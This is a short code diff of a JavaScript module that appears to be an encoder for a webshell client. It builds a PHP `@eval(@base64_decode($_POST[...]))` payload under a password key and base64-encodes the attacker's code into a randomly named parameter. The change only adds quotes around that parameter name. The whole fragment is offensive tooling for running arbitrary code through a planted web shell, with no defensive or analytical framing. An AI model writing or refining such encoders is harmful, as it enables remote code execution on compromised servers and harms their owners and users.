@@ -16,7 +16,7 @@ module.exports = (pwd, data, ext = null) => {
   data[randomID] = Buffer
     .from(data['_'])
     .toString('base64');
-  data[pwd] = `@eval(@base64_decode($_POST[${randomID}]));`;
+  data[pwd] = `@eval(@base64_decode($_POST['${randomID}']));`;
   delete data['_'];
   return data;
 }
